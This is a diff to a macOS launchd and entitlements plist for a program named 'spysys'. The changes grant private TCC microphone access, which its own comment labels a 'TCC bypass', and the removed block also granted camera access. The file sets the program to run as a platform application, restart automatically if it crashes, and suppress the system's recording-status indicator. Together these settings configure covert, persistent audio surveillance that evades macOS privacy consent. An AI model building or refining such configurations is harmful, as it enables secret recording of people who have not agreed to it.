@@ -10,6 +10,12 @@
         <string>/usr/local/bin/spysys</string>
     </array>
 
+    <!-- CRITICAL: Directly grants microphone access permission (TCC bypass) -->
+    <key>com.apple.private.tcc.allow</key>
+    <array>
+        <string>kTCCServiceMicrophone</string>
+    </array>
+
     <!-- CRITICAL: Instead of StartInterval, we use KeepAlive to restart if it crashes. -->
     <!-- The program is now responsible for its own timing (using sleep(60)). -->
     <key>KeepAlive</key>
@@ -27,15 +33,11 @@
     <key>com.apple.private.security.container-required</key>
     <false/>
 
+    <!-- CRITICAL: Allows the app to run as a system service -->
     <key>platform-application</key>
-    <true/>
+    <true/> 
 
-    <key>com.apple.private.tcc.allow</key>
-    <array>
-        <string>kTCCServiceMicrophone</string>
-        <string>kTCCServiceCamera</string>
-    </array>
-
+    <!-- OPTIONAL: Other common private entitlements -->
     <key>com.apple.private.mediaexperience.suppressrecordingstatetosystemstatus</key>
     <true/>
 
